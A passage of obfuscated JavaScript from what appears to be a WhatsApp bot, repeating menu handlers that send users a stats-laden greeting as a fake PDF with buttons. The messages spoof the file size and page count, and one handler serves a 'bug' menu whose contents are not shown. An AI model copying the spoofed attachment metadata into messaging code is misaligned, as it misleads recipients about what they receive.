            'buttonId': _0x4773c6 + 'owner',
            'buttonText': {
              'displayText': "Owner 👤"
            }
          }, {
            'buttonId': _0x4773c6 + "ping",
            'buttonText': {
              'displayText': "Server 🌟"
            }
          }];
          const _0x465dfc = [{
            'buttonId': _0x4773c6 + "owner",
            'buttonText': {
              'displayText': "👑 Kenalan Sama Owner"
            },
            'type': 0x4,
            'nativeFlowInfo': {
              'name': "single_select",
              'paramsJson': JSON.stringify({
                'title': "📂 Pilih Menu",
                'sections': [{
                  'title': "🔹 Opsi Menu",
                  'rows': [{
                    'header': "🎁 Menu Utama",
                    'title': "Lihat semua fitur keren yang tersedia! 🌟",
                    'id': _0x4773c6 + "menu"
                  }, {
                    'header': "🛃 Daftar Sekarang",
                    'title': "Gabung untuk akses fitur premium! 🎟️",
                    'id': _0x4773c6 + "daftar"
                  }, {
                    'header': "📞 Hubungi Owner",
                    'title': "Butuh bantuan? Hubungi owner di sini! 💬",
                    'id': _0x4773c6 + "owner"
                  }]
                }]
              })
            },
            'viewOnce': true
          }];
          const _0x106714 = {
            'document': imageBuffer,
            'fileName': ucapanWaktu,
            'fileLength': 0xf4240,
            'pageCount': 0x64,
            'mimetype': 'application/pdf',
            'caption': _0x59d175,
            'footer': footer,
            'buttons': [..._0x17c66f, ..._0x465dfc],
            'headerType': 0x6,
            'viewOnce': true,
            'contextInfo': {
              'externalAdReply': {
                'containsAutoReply': true,
                'mediaType': 0x1,
                'renderLargerThumbnail': true,
                'showAdAttribution': true,
                'thumbnailUrl': imageUrl,
                'title': _0xdd1e8d,
                'body': ucapanWaktu
              }
            }
          };
          return _0x59f5fa.sendMessage(_0x3f87c6.chat, _0x106714, {
            'quoted': _0x3f87c6
          });
        }
        break;
      case "convertmenu":
      case "toolsmenu":
        {
          let _0x16ad5f = speed();
          let _0x198e3e = speed() - _0x16ad5f;
          let _0x4f41c1 = db.data.users[_0x3f87c6.sender];
          let _0x225507 = _0x3f87c6.sender;
          await _0x3f87c6.react('⏱️');
          let _0xc259cf = "┌──❖ Halo, Kak " + _0xdd1e8d + "! 👋✨\n│ ✧ " + ucapanWaktu + " yaa! 😊\n└────────────⳹\n\n" + readmore + "🌟 *𝐁𝐎𝐓 𝐈𝐍𝐅𝐎*\n⨳ *Speed*: " + _0x198e3e.toFixed(0x4) + " ms\n⨳ *Runtime*: " + runtime(process.uptime()) + "\n⨳ *Bot*: " + botName + "\n⨳ *Owner*: +" + ownerNumber + "\n⨳ *Mode*: " + (_0x59f5fa['public'] ? "Public" : 'Self') + "\n⨳ *Platform*: " + os.platform() + "\n⨳ *Total User*: " + Object.keys(db.data.users).length + "\n⨳ *Total Chat*: " + Object.keys(global.db.data.chats).length + "\n\n🧍 *𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎*\n⨳ *Nama*: " + _0xdd1e8d + "\n⨳ *Number*: +" + _0x225507.split('@')[0x0] + "\n⨳ *Limit*: " + _0x4f41c1.limit + "\n⨳ *Status*: " + (_0x18b09f ? "VIP User" : _0x256404 ? "Premium User" : "Free User") + "\n⨳ *Serial*: " + _0x4f41c1.serialNumber + "\n\n🕒 *𝐓𝐈𝐌𝐄 𝐈𝐍𝐅𝐎*\n⨳ *Time*: " + time + "\n⨳ *Date*: " + date + "\n\n" + readmore + convertMenu(_0x4773c6) + "\n\n✨ *Semoga harimu menyenangkan, Kak!* 🥰";
          const _0x5d73b8 = [{
            'buttonId': _0x4773c6 + "owner",
            'buttonText': {
              'displayText': "Owner 👤"
            }
          }, {
            'buttonId': _0x4773c6 + 'ping',
            'buttonText': {
              'displayText': "Server 🌟"
            }
          }];
          const _0x4d7d7e = [{
            'buttonId': _0x4773c6 + "owner",
            'buttonText': {
              'displayText': "👑 Kenalan Sama Owner"
            },
            'type': 0x4,
            'nativeFlowInfo': {
              'name': 'single_select',
              'paramsJson': JSON.stringify({
                'title': "📂 Pilih Menu",
                'sections': [{
                  'title': "🔹 Opsi Menu",
                  'rows': [{
                    'header': "🎁 Menu Utama",
                    'title': "Lihat semua fitur keren yang tersedia! 🌟",
                    'id': _0x4773c6 + "menu"
                  }, {
                    'header': "🛃 Daftar Sekarang",
                    'title': "Gabung untuk akses fitur premium! 🎟️",
                    'id': _0x4773c6 + "daftar"
                  }, {
                    'header': "📞 Hubungi Owner",
                    'title': "Butuh bantuan? Hubungi owner di sini! 💬",
                    'id': _0x4773c6 + "owner"
                  }]
                }]
              })
            },
            'viewOnce': true
          }];
          const _0x2ea12d = {
            'document': imageBuffer,
            'fileName': ucapanWaktu,
            'fileLength': 0xf4240,
            'pageCount': 0x64,
            'mimetype': "application/pdf",
            'caption': _0xc259cf,
            'footer': footer,
            'buttons': [..._0x5d73b8, ..._0x4d7d7e],
            'headerType': 0x6,
            'viewOnce': true,
            'contextInfo': {
              'externalAdReply': {
                'containsAutoReply': true,
                'mediaType': 0x1,
                'renderLargerThumbnail': true,
                'showAdAttribution': true,
                'thumbnailUrl': imageUrl,
                'title': _0xdd1e8d,
                'body': ucapanWaktu
              }
            }
          };
          return _0x59f5fa.sendMessage(_0x3f87c6.chat, _0x2ea12d, {
            'quoted': _0x3f87c6
          });
        }
        break;
      case "storemenu":
      case "stmenu":
        {
          let _0x1df38f = speed();
          let _0x277f8d = speed() - _0x1df38f;
          let _0x250951 = db.data.users[_0x3f87c6.sender];
          let _0x44ed7e = _0x3f87c6.sender;
          await _0x3f87c6.react('⏱️');
          let _0x4fd8aa = "┌──❖ Halo, Kak " + _0xdd1e8d + "! 👋✨\n│ ✧ " + ucapanWaktu + " yaa! 😊\n└────────────⳹\n\n" + readmore + "🌟 *𝐁𝐎𝐓 𝐈𝐍𝐅𝐎*\n⨳ *Speed*: " + _0x277f8d.toFixed(0x4) + " ms\n⨳ *Runtime*: " + runtime(process.uptime()) + "\n⨳ *Bot*: " + botName + "\n⨳ *Owner*: +" + ownerNumber + "\n⨳ *Mode*: " + (_0x59f5fa['public'] ? "Public" : 'Self') + "\n⨳ *Platform*: " + os.platform() + "\n⨳ *Total User*: " + Object.keys(db.data.users).length + "\n⨳ *Total Chat*: " + Object.keys(global.db.data.chats).length + "\n\n🧍 *𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎*\n⨳ *Nama*: " + _0xdd1e8d + "\n⨳ *Number*: +" + _0x44ed7e.split('@')[0x0] + "\n⨳ *Limit*: " + _0x250951.limit + "\n⨳ *Status*: " + (_0x18b09f ? "VIP User" : _0x256404 ? "Premium User" : "Free User") + "\n⨳ *Serial*: " + _0x250951.serialNumber + "\n\n🕒 *𝐓𝐈𝐌𝐄 𝐈𝐍𝐅𝐎*\n⨳ *Time*: " + time + "\n⨳ *Date*: " + date + "\n\n" + readmore + storeMenu(_0x4773c6) + "\n\n✨ *Semoga harimu menyenangkan, Kak!* 🥰";
          const _0x2a3f39 = [{
            'buttonId': _0x4773c6 + "owner",
            'buttonText': {
              'displayText': "Owner 👤"
            }
          }, {
            'buttonId': _0x4773c6 + 'ping',
            'buttonText': {
              'displayText': "Server 🌟"
            }
          }];
          const _0x39073b = [{
            'buttonId': _0x4773c6 + "owner",
            'buttonText': {
              'displayText': "👑 Kenalan Sama Owner"
            },
            'type': 0x4,
            'nativeFlowInfo': {
              'name': "single_select",
              'paramsJson': JSON.stringify({
                'title': "📂 Pilih Menu",
                'sections': [{
                  'title': "🔹 Opsi Menu",
                  'rows': [{
                    'header': "🎁 Menu Utama",
                    'title': "Lihat semua fitur keren yang tersedia! 🌟",
                    'id': _0x4773c6 + "menu"
                  }, {
                    'header': "🛃 Daftar Sekarang",
                    'title': "Gabung untuk akses fitur premium! 🎟️",
                    'id': _0x4773c6 + "daftar"
                  }, {
                    'header': "📞 Hubungi Owner",
                    'title': "Butuh bantuan? Hubungi owner di sini! 💬",
                    'id': _0x4773c6 + 'owner'
                  }]
                }]
              })
            },
            'viewOnce': true
          }];
          const _0x1ab1e8 = {
            'document': imageBuffer,
            'fileName': ucapanWaktu,
            'fileLength': 0xf4240,
            'pageCount': 0x64,
            'mimetype': "application/pdf",
            'caption': _0x4fd8aa,
            'footer': footer,
            'buttons': [..._0x2a3f39, ..._0x39073b],
            'headerType': 0x6,
            'viewOnce': true,
            'contextInfo': {
              'externalAdReply': {
                'containsAutoReply': true,
                'mediaType': 0x1,
                'renderLargerThumbnail': true,
                'showAdAttribution': true,
                'thumbnailUrl': imageUrl,
                'title': _0xdd1e8d,
                'body': ucapanWaktu
              }
            }
          };
          return _0x59f5fa.sendMessage(_0x3f87c6.chat, _0x1ab1e8, {
            'quoted': _0x3f87c6
          });
        }
        break;
      case "panelmenu":
      case "pmenu":
        {
          let _0x31b08b = speed();
          let _0x360353 = speed() - _0x31b08b;
          let _0x16dd8c = db.data.users[_0x3f87c6.sender];
          let _0x1613ec = _0x3f87c6.sender;
          await _0x3f87c6.react('⏱️');
          let _0xb77606 = "┌──❖ Halo, Kak " + _0xdd1e8d + "! 👋✨\n│ ✧ " + ucapanWaktu + " yaa! 😊\n└────────────⳹\n\n" + readmore + "🌟 *𝐁𝐎𝐓 𝐈𝐍𝐅𝐎*\n⨳ *Speed*: " + _0x360353.toFixed(0x4) + " ms\n⨳ *Runtime*: " + runtime(process.uptime()) + "\n⨳ *Bot*: " + botName + "\n⨳ *Owner*: +" + ownerNumber + "\n⨳ *Mode*: " + (_0x59f5fa["public"] ? "Public" : "Self") + "\n⨳ *Platform*: " + os.platform() + "\n⨳ *Total User*: " + Object.keys(db.data.users).length + "\n⨳ *Total Chat*: " + Object.keys(global.db.data.chats).length + "\n\n🧍 *𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎*\n⨳ *Nama*: " + _0xdd1e8d + "\n⨳ *Number*: +" + _0x1613ec.split('@')[0x0] + "\n⨳ *Limit*: " + _0x16dd8c.limit + "\n⨳ *Status*: " + (_0x18b09f ? "VIP User" : _0x256404 ? "Premium User" : "Free User") + "\n⨳ *Serial*: " + _0x16dd8c.serialNumber + "\n\n🕒 *𝐓𝐈𝐌𝐄 𝐈𝐍𝐅𝐎*\n⨳ *Time*: " + time + "\n⨳ *Date*: " + date + "\n\n" + readmore + panelMenu(_0x4773c6) + "\n\n✨ *Semoga harimu menyenangkan, Kak!* 🥰";
          const _0x2795ef = [{
            'buttonId': _0x4773c6 + 'owner',
            'buttonText': {
              'displayText': "Owner 👤"
            }
          }, {
            'buttonId': _0x4773c6 + "ping",
            'buttonText': {
              'displayText': "Server 🌟"
            }
          }];
          const _0xe9b91 = [{
            'buttonId': _0x4773c6 + "owner",
            'buttonText': {
              'displayText': "👑 Kenalan Sama Owner"
            },
            'type': 0x4,
            'nativeFlowInfo': {
              'name': "single_select",
              'paramsJson': JSON.stringify({
                'title': "📂 Pilih Menu",
                'sections': [{
                  'title': "🔹 Opsi Menu",
                  'rows': [{
                    'header': "🎁 Menu Utama",
                    'title': "Lihat semua fitur keren yang tersedia! 🌟",
                    'id': _0x4773c6 + "menu"
                  }, {
                    'header': "🛃 Daftar Sekarang",
                    'title': "Gabung untuk akses fitur premium! 🎟️",
                    'id': _0x4773c6 + 'daftar'
                  }, {
                    'header': "📞 Hubungi Owner",
                    'title': "Butuh bantuan? Hubungi owner di sini! 💬",
                    'id': _0x4773c6 + "owner"
                  }]
                }]
              })
            },
            'viewOnce': true
          }];
          const _0xefcfea = {
            'document': imageBuffer,
            'fileName': ucapanWaktu,
            'fileLength': 0xf4240,
            'pageCount': 0x64,
            'mimetype': "application/pdf",
            'caption': _0xb77606,
            'footer': footer,
            'buttons': [..._0x2795ef, ..._0xe9b91],
            'headerType': 0x6,
            'viewOnce': true,
            'contextInfo': {
              'externalAdReply': {
                'containsAutoReply': true,
                'mediaType': 0x1,
                'renderLargerThumbnail': true,
                'showAdAttribution': true,
                'thumbnailUrl': imageUrl,
                'title': _0xdd1e8d,
                'body': ucapanWaktu
              }
            }
          };
          return _0x59f5fa.sendMessage(_0x3f87c6.chat, _0xefcfea, {
            'quoted': _0x3f87c6
          });
        }
        break;
      case 'gamemenu':
      case "gmenu":
        {
          let _0x415060 = speed();
          let _0x3c6160 = speed() - _0x415060;
          let _0xf108bb = db.data.users[_0x3f87c6.sender];
          let _0x5f4b18 = _0x3f87c6.sender;
          await _0x3f87c6.react('⏱️');
          let _0x4a6730 = "┌──❖ Halo, Kak " + _0xdd1e8d + "! 👋✨\n│ ✧ " + ucapanWaktu + " yaa! 😊\n└────────────⳹\n\n" + readmore + "🌟 *𝐁𝐎𝐓 𝐈𝐍𝐅𝐎*\n⨳ *Speed*: " + _0x3c6160.toFixed(0x4) + " ms\n⨳ *Runtime*: " + runtime(process.uptime()) + "\n⨳ *Bot*: " + botName + "\n⨳ *Owner*: +" + ownerNumber + "\n⨳ *Mode*: " + (_0x59f5fa["public"] ? 'Public' : "Self") + "\n⨳ *Platform*: " + os.platform() + "\n⨳ *Total User*: " + Object.keys(db.data.users).length + "\n⨳ *Total Chat*: " + Object.keys(global.db.data.chats).length + "\n\n🧍 *𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎*\n⨳ *Nama*: " + _0xdd1e8d + "\n⨳ *Number*: +" + _0x5f4b18.split('@')[0x0] + "\n⨳ *Limit*: " + _0xf108bb.limit + "\n⨳ *Status*: " + (_0x18b09f ? "VIP User" : _0x256404 ? "Premium User" : "Free User") + "\n⨳ *Serial*: " + _0xf108bb.serialNumber + "\n\n🕒 *𝐓𝐈𝐌𝐄 𝐈𝐍𝐅𝐎*\n⨳ *Time*: " + time + "\n⨳ *Date*: " + date + "\n\n" + readmore + gameMenu(_0x4773c6) + "\n\n✨ *Semoga harimu menyenangkan, Kak!* 🥰";
          const _0x3e9111 = [{
            'buttonId': _0x4773c6 + "owner",
            'buttonText': {
              'displayText': "Owner 👤"
            }
          }, {
            'buttonId': _0x4773c6 + "ping",
            'buttonText': {
              'displayText': "Server 🌟"
            }
          }];
          const _0x59072e = [{
            'buttonId': _0x4773c6 + "owner",
            'buttonText': {
              'displayText': "👑 Kenalan Sama Owner"
            },
            'type': 0x4,
            'nativeFlowInfo': {
              'name': "single_select",
              'paramsJson': JSON.stringify({
                'title': "📂 Pilih Menu",
                'sections': [{
                  'title': "🔹 Opsi Menu",
                  'rows': [{
                    'header': "🎁 Menu Utama",
                    'title': "Lihat semua fitur keren yang tersedia! 🌟",
                    'id': _0x4773c6 + "menu"
                  }, {
                    'header': "🛃 Daftar Sekarang",
                    'title': "Gabung untuk akses fitur premium! 🎟️",
                    'id': _0x4773c6 + "daftar"
                  }, {
                    'header': "📞 Hubungi Owner",
                    'title': "Butuh bantuan? Hubungi owner di sini! 💬",
                    'id': _0x4773c6 + "owner"
                  }]
                }]
              })
            },
            'viewOnce': true
          }];
          const _0x5c3da3 = {
            'document': imageBuffer,
            'fileName': ucapanWaktu,
            'fileLength': 0xf4240,
            'pageCount': 0x64,
            'mimetype': "application/pdf",
            'caption': _0x4a6730,
            'footer': footer,
            'buttons': [..._0x3e9111, ..._0x59072e],
            'headerType': 0x6,
            'viewOnce': true,
            'contextInfo': {
              'externalAdReply': {
                'containsAutoReply': true,
                'mediaType': 0x1,
                'renderLargerThumbnail': true,
                'showAdAttribution': true,
                'thumbnailUrl': imageUrl,
                'title': _0xdd1e8d,
                'body': ucapanWaktu
              }
            }
          };
          return _0x59f5fa.sendMessage(_0x3f87c6.chat, _0x5c3da3, {
            'quoted': _0x3f87c6
          });
        }
        break;
      case "funmenu":
      case "fmenu":
        {
          let _0x1efced = speed();
          let _0x2afb04 = speed() - _0x1efced;
          let _0x1630d1 = db.data.users[_0x3f87c6.sender];
          let _0x174c13 = _0x3f87c6.sender;
          await _0x3f87c6.react('⏱️');
          let _0x29ed3f = "┌──❖ Halo, Kak " + _0xdd1e8d + "! 👋✨\n│ ✧ " + ucapanWaktu + " yaa! 😊\n└────────────⳹\n\n" + readmore + "🌟 *𝐁𝐎𝐓 𝐈𝐍𝐅𝐎*\n⨳ *Speed*: " + _0x2afb04.toFixed(0x4) + " ms\n⨳ *Runtime*: " + runtime(process.uptime()) + "\n⨳ *Bot*: " + botName + "\n⨳ *Owner*: +" + ownerNumber + "\n⨳ *Mode*: " + (_0x59f5fa["public"] ? 'Public' : "Self") + "\n⨳ *Platform*: " + os.platform() + "\n⨳ *Total User*: " + Object.keys(db.data.users).length + "\n⨳ *Total Chat*: " + Object.keys(global.db.data.chats).length + "\n\n🧍 *𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎*\n⨳ *Nama*: " + _0xdd1e8d + "\n⨳ *Number*: +" + _0x174c13.split('@')[0x0] + "\n⨳ *Limit*: " + _0x1630d1.limit + "\n⨳ *Status*: " + (_0x18b09f ? "VIP User" : _0x256404 ? "Premium User" : "Free User") + "\n⨳ *Serial*: " + _0x1630d1.serialNumber + "\n\n🕒 *𝐓𝐈𝐌𝐄 𝐈𝐍𝐅𝐎*\n⨳ *Time*: " + time + "\n⨳ *Date*: " + date + "\n\n" + readmore + funMenu(_0x4773c6) + "\n\n✨ *Semoga harimu menyenangkan, Kak!* 🥰";
          const _0x1993d3 = [{
            'buttonId': _0x4773c6 + "owner",
            'buttonText': {
              'displayText': "Owner 👤"
            }
          }, {
            'buttonId': _0x4773c6 + 'ping',
            'buttonText': {
              'displayText': "Server 🌟"
            }
          }];
          const _0x5153e1 = [{
            'buttonId': _0x4773c6 + 'owner',
            'buttonText': {
              'displayText': "👑 Kenalan Sama Owner"
            },
            'type': 0x4,
            'nativeFlowInfo': {
              'name': "single_select",
              'paramsJson': JSON.stringify({
                'title': "📂 Pilih Menu",
                'sections': [{
                  'title': "🔹 Opsi Menu",
                  'rows': [{
                    'header': "🎁 Menu Utama",
                    'title': "Lihat semua fitur keren yang tersedia! 🌟",
                    'id': _0x4773c6 + 'menu'
                  }, {
                    'header': "🛃 Daftar Sekarang",
                    'title': "Gabung untuk akses fitur premium! 🎟️",
                    'id': _0x4773c6 + "daftar"
                  }, {
                    'header': "📞 Hubungi Owner",
                    'title': "Butuh bantuan? Hubungi owner di sini! 💬",
                    'id': _0x4773c6 + 'owner'
                  }]
                }]
              })
            },
            'viewOnce': true
          }];
          const _0x44a8af = {
            'document': imageBuffer,
            'fileName': ucapanWaktu,
            'fileLength': 0xf4240,
            'pageCount': 0x64,
            'mimetype': 'application/pdf',
            'caption': _0x29ed3f,
            'footer': footer,
            'buttons': [..._0x1993d3, ..._0x5153e1],
            'headerType': 0x6,
            'viewOnce': true,
            'contextInfo': {
              'externalAdReply': {
                'containsAutoReply': true,
                'mediaType': 0x1,
                'renderLargerThumbnail': true,
                'showAdAttribution': true,
                'thumbnailUrl': imageUrl,
                'title': _0xdd1e8d,
                'body': ucapanWaktu
              }
            }
          };
          return _0x59f5fa.sendMessage(_0x3f87c6.chat, _0x44a8af, {
            'quoted': _0x3f87c6
          });
        }
        break;
      case "randomanimemenu":
      case "ramenu":
        {
          let _0x1e3895 = speed();
          let _0x2cac6f = speed() - _0x1e3895;
          let _0x2f1dba = db.data.users[_0x3f87c6.sender];
          let _0x50a062 = _0x3f87c6.sender;
          await _0x3f87c6.react('⏱️');
          let _0x5c6871 = "┌──❖ Halo, Kak " + _0xdd1e8d + "! 👋✨\n│ ✧ " + ucapanWaktu + " yaa! 😊\n└────────────⳹\n\n" + readmore + "🌟 *𝐁𝐎𝐓 𝐈𝐍𝐅𝐎*\n⨳ *Speed*: " + _0x2cac6f.toFixed(0x4) + " ms\n⨳ *Runtime*: " + runtime(process.uptime()) + "\n⨳ *Bot*: " + botName + "\n⨳ *Owner*: +" + ownerNumber + "\n⨳ *Mode*: " + (_0x59f5fa["public"] ? 'Public' : 'Self') + "\n⨳ *Platform*: " + os.platform() + "\n⨳ *Total User*: " + Object.keys(db.data.users).length + "\n⨳ *Total Chat*: " + Object.keys(global.db.data.chats).length + "\n\n🧍 *𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎*\n⨳ *Nama*: " + _0xdd1e8d + "\n⨳ *Number*: +" + _0x50a062.split('@')[0x0] + "\n⨳ *Limit*: " + _0x2f1dba.limit + "\n⨳ *Status*: " + (_0x18b09f ? "VIP User" : _0x256404 ? "Premium User" : "Free User") + "\n⨳ *Serial*: " + _0x2f1dba.serialNumber + "\n\n🕒 *𝐓𝐈𝐌𝐄 𝐈𝐍𝐅𝐎*\n⨳ *Time*: " + time + "\n⨳ *Date*: " + date + "\n\n" + readmore + randomAnimeMenu(_0x4773c6) + "\n\n✨ *Semoga harimu menyenangkan, Kak!* 🥰";
          const _0x16dfa3 = [{
            'buttonId': _0x4773c6 + 'owner',
            'buttonText': {
              'displayText': "Owner 👤"
            }
          }, {
            'buttonId': _0x4773c6 + "ping",
            'buttonText': {
              'displayText': "Server 🌟"
            }
          }];
          const _0x365c14 = [{
            'buttonId': _0x4773c6 + "owner",
            'buttonText': {
              'displayText': "👑 Kenalan Sama Owner"
            },
            'type': 0x4,
            'nativeFlowInfo': {
              'name': 'single_select',
              'paramsJson': JSON.stringify({
                'title': "📂 Pilih Menu",
                'sections': [{
                  'title': "🔹 Opsi Menu",
                  'rows': [{
                    'header': "🎁 Menu Utama",
                    'title': "Lihat semua fitur keren yang tersedia! 🌟",
                    'id': _0x4773c6 + 'menu'
                  }, {
                    'header': "🛃 Daftar Sekarang",
                    'title': "Gabung untuk akses fitur premium! 🎟️",
                    'id': _0x4773c6 + "daftar"
                  }, {
                    'header': "📞 Hubungi Owner",
                    'title': "Butuh bantuan? Hubungi owner di sini! 💬",
                    'id': _0x4773c6 + 'owner'
                  }]
                }]
              })
            },
            'viewOnce': true
          }];
          const _0x5ab5a7 = {
            'document': imageBuffer,
            'fileName': ucapanWaktu,
            'fileLength': 0xf4240,
            'pageCount': 0x64,
            'mimetype': "application/pdf",
            'caption': _0x5c6871,
            'footer': footer,
            'buttons': [..._0x16dfa3, ..._0x365c14],
            'headerType': 0x6,
            'viewOnce': true,
            'contextInfo': {
              'externalAdReply': {
                'containsAutoReply': true,
                'mediaType': 0x1,
                'renderLargerThumbnail': true,
                'showAdAttribution': true,
                'thumbnailUrl': imageUrl,
                'title': _0xdd1e8d,
                'body': ucapanWaktu
              }
            }
          };
          return _0x59f5fa.sendMessage(_0x3f87c6.chat, _0x5ab5a7, {
            'quoted': _0x3f87c6
          });
        }
        break;
      case 'bugmenu':
      case 'bgmenu':
        {
          let _0x47462b = speed();
          let _0x16811e = speed() - _0x47462b;
          let _0x1f9b81 = db.data.users[_0x3f87c6.sender];
          let _0x1cbb0c = _0x3f87c6.sender;
          await _0x3f87c6.react('⏱️');
          let _0x16d9a3 = "┌──❖ Halo, Kak " + _0xdd1e8d + "! 👋✨\n│ ✧ " + ucapanWaktu + " yaa! 😊\n└────────────⳹\n\n" + readmore + "🌟 *𝐁𝐎𝐓 𝐈𝐍𝐅𝐎*\n⨳ *Speed*: " + _0x16811e.toFixed(0x4) + " ms\n⨳ *Runtime*: " + runtime(process.uptime()) + "\n⨳ *Bot*: " + botName + "\n⨳ *Owner*: +" + ownerNumber + "\n⨳ *Mode*: " + (_0x59f5fa['public'] ? "Public" : "Self") + "\n⨳ *Platform*: " + os.platform() + "\n⨳ *Total User*: " + Object.keys(db.data.users).length + "\n⨳ *Total Chat*: " + Object.keys(global.db.data.chats).length + "\n\n🧍 *𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎*\n⨳ *Nama*: " + _0xdd1e8d + "\n⨳ *Number*: +" + _0x1cbb0c.split('@')[0x0] + "\n⨳ *Limit*: " + _0x1f9b81.limit + "\n⨳ *Status*: " + (_0x18b09f ? "VIP User" : _0x256404 ? "Premium User" : "Free User") + "\n⨳ *Serial*: " + _0x1f9b81.serialNumber + "\n\n🕒 *𝐓𝐈𝐌𝐄 𝐈𝐍𝐅𝐎*\n⨳ *Time*: " + time + "\n⨳ *Date*: " + date + "\n\n" + readmore + bugMenu(_0x4773c6) + "\n\n✨ *Semoga harimu menyenangkan, Kak!* 🥰";
          const _0x53f1bb = [{
            'buttonId': _0x4773c6 + "owner",
            'buttonText': {
              'displayText': "Owner 👤"
            }
          }, {
            'buttonId': _0x4773c6 + "ping",
            'buttonText': {
              'displayText': "Server 🌟"
            }
          }];
          const _0x1006e9 = [{
            'buttonId': _0x4773c6 + "owner",
            'buttonText': {
              'displayText': "👑 Kenalan Sama Owner"
            },
            'type': 0x4,
            'nativeFlowInfo': {
              'name': "single_select",
              'paramsJson': JSON.stringify({
                'title': "📂 Pilih Menu",
                'sections': [{
                  'title': "🔹 Opsi Menu",
                  'rows': [{
                    'header': "🎁 Menu Utama",
                    'title': "Lihat semua fitur keren yang tersedia! 🌟",
                    'id': _0x4773c6 + 'menu'
                  }, {
                    'header': "🛃 Daftar Sekarang",
                    'title': "Gabung untuk akses fitur premium! 🎟️",
                    'id': _0x4773c6 + "daftar"
                  }, {
                    'header': "📞 Hubungi Owner",
                    'title': "Butuh bantuan? Hubungi owner di sini! 💬",
                    'id': _0x4773c6 + "owner"
                  }]
                }]
              })
            },
            'viewOnce': true
          }];
          const _0x174382 = {
            'document': imageBuffer,
            'fileName': ucapanWaktu,
            'fileLength': 0xf4240,
            'pageCount': 0x64,
            'mimetype': "application/pdf",
            'caption': _0x16d9a3,
            'footer': footer,
            'buttons': [..._0x53f1bb, ..._0x1006e9],
            'headerType': 0x6,
            'viewOnce': true,
            'contextInfo': {
              'externalAdReply': {
                'containsAutoReply': true,
                'mediaType': 0x1,
                'renderLargerThumbnail': true,
                'showAdAttribution': true,
                'thumbnailUrl': imageUrl,
                'title': _0xdd1e8d,
                'body': ucapanWaktu
              }
            }
          };
          return _0x59f5fa.sendMessage(_0x3f87c6.chat, _0x174382, {
            'quoted': _0x3f87c6
          });
        }
        break;
      case "rpgmenu":
      case "rmenu":
        {
          let _0x418875 = speed();
          let _0x1d6dfa = speed() - _0x418875;
          let _0x237388 = db.data.users[_0x3f87c6.sender];
          let _0x4e77eb = _0x3f87c6.sender;
          await _0x3f87c6.react('⏱️');
          let _0x4e8656 = "┌──❖ Halo, Kak " + _0xdd1e8d + "! 👋✨\n│ ✧ " + ucapanWaktu + " yaa! 😊\n└────────────⳹\n\n" + readmore + "🌟 *𝐁𝐎𝐓 𝐈𝐍𝐅𝐎*\n⨳ *Speed*: " + _0x1d6dfa.toFixed(0x4) + " ms\n⨳ *Runtime*: " + runtime(process.uptime()) + "\n⨳ *Bot*: " + botName + "\n⨳ *Owner*: +" + ownerNumber + "\n⨳ *Mode*: " + (_0x59f5fa["public"] ? 'Public' : 'Self') + "\n⨳ *Platform*: " + os.platform() + "\n⨳ *Total User*: " + Object.keys(db.data.users).length + "\n⨳ *Total Chat*: " + Object.keys(global.db.data.chats).length + "\n\n🧍 *𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎*\n⨳ *Nama*: " + _0xdd1e8d + "\n⨳ *Number*: +" + _0x4e77eb.split('@')[0x0] + "\n⨳ *Limit*: " + _0x237388.limit + "\n⨳ *Status*: " + (_0x18b09f ? "VIP User" : _0x256404 ? "Premium User" : "Free User") + "\n⨳ *Serial*: " + _0x237388.serialNumber + "\n\n🕒 *𝐓𝐈𝐌𝐄 𝐈𝐍𝐅𝐎*\n⨳ *Time*: " + time + "\n⨳ *Date*: " + date + "\n\n" + readmore + rpgMenu(_0x4773c6) + "\n\n✨ *Semoga harimu menyenangkan, Kak!* 🥰";
          const _0x31957a = [{
            'buttonId': _0x4773c6 + "owner",
            'buttonText': {
              'displayText': "Owner 👤"
            }
          }, {
            'buttonId': _0x4773c6 + "ping",
            'buttonText': {
              'displayText': "Server 🌟"
            }
          }];
          const _0x2b5511 = [{
            'buttonId': _0x4773c6 + "owner",
            'buttonText': {
              'displayText': "👑 Kenalan Sama Owner"
            },
            'type': 0x4,
            'nativeFlowInfo': {
              'name': 'single_select',
              'paramsJson': JSON.stringify({
                'title': "📂 Pilih Menu",
                'sections': [{
                  'title': "🔹 Opsi Menu",
                  'rows': [{
                    'header': "🎁 Menu Utama",
                    'title': "Lihat semua fitur keren yang tersedia! 🌟",
                    'id': _0x4773c6 + "menu"
                  }, {
                    'header': "🛃 Daftar Sekarang",
                    'title': "Gabung untuk akses fitur premium! 🎟️",
                    'id': _0x4773c6 + "daftar"
                  }, {
                    'header': "📞 Hubungi Owner",
                    'title': "Butuh bantuan? Hubungi owner di sini! 💬",
                    'id': _0x4773c6 + 'owner'
                  }]
                }]
              })
            },
            'viewOnce': true
          }];
          const _0x379c40 = {
            'document': imageBuffer,
            'fileName': ucapanWaktu,
            'fileLength': 0xf4240,
            'pageCount': 0x64,
            'mimetype': 'application/pdf',
            'caption': _0x4e8656,
            'footer': footer,
            'buttons': [..._0x31957a, ..._0x2b5511],
            'headerType': 0x6,
            'viewOnce': true,
            'contextInfo': {
              'externalAdReply': {
                'containsAutoReply': true,
                'mediaType': 0x1,
                'renderLargerThumbnail': true,
                'showAdAttribution': true,
                'thumbnailUrl': imageUrl,
                'title': _0xdd1e8d,
                'body': ucapanWaktu
              }
            }
          };
          return _0x59f5fa.sendMessage(_0x3f87c6.chat, _0x379c40, {
            'quoted': _0x3f87c6
          });
        }
        break;
      case "privacymenu":
      case "prmenu":
        {
          let _0x338657 = speed();
          let _0x40a839 = speed() - _0x338657;
          let _0x3e2e7f = db.data.users[_0x3f87c6.sender];
          let _0x2b983f = _0x3f87c6.sender;
          await _0x3f87c6.react('⏱️');
